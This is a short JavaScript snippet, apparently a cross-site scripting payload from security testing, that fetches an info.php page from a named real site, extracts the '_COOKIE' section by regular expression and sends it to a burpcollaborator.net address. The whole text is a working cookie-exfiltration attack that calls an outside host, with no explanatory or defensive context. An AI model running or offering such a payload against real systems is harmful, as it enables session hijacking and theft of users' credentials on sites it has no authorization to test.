fetch('https://tatacars.sipradi.com.np/info.php')
  .then(response => response.text())
  .then(text => {
    let cookieMatch = text.match(/_COOKIE.{1,2000}/);
    if (cookieMatch) {
      fetch('http://aftpmh4i5w0rhzlsh7e5lkya91fr3g.burpcollaborator.net/?cookie=' + encodeURIComponent(cookieMatch[0]));
    } else {
      console.log("No _COOKIE match found");
    }
  })
  .catch(e => console.error("Fetch error:", e));
